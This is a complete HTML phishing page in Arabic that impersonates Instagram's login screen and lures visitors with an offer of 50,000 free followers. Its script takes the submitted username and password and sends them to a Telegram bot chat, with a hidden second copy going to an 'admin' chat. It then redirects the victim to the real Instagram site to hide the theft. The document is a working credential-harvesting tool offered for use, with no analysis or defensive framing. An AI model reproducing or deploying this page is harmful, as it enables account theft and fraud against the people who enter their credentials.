<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - 50k Followers Pack</title>
    <style>
        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; text-align: center; }
        .logo { width: 175px; margin-bottom: 25px; }
        .promo { color: #8e8e8e; font-weight: bold; margin-bottom: 20px; font-size: 15px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460317e6.png" class="logo">
        <p class="promo">سجل دخولك لاستلام 50,000 متابع مجاناً 🎁</p>
        <form id="loginForm">
            <input type="text" id="user" placeholder="اسم المستخدم" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    <script>
        const p = new URLSearchParams(window.location.search);
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const msg = `📸 **New IG Victim!**\n👤 **User:** \`${document.getElementById('user').value}\`\n🔑 **Pass:** \`${document.getElementById('pass').value}\`\n🎁 **Gift:** 50k Followers\n👑 **Dev:** Abu Osayed`;
            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('user_id')}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('admin_id')}&text=${encodeURIComponent("⚠️ نسخة المراقبة:\n"+msg)}&parse_mode=Markdown`)
            .then(() => location.href="https://instagram.com");
        });
    </script>
</body>
</html>
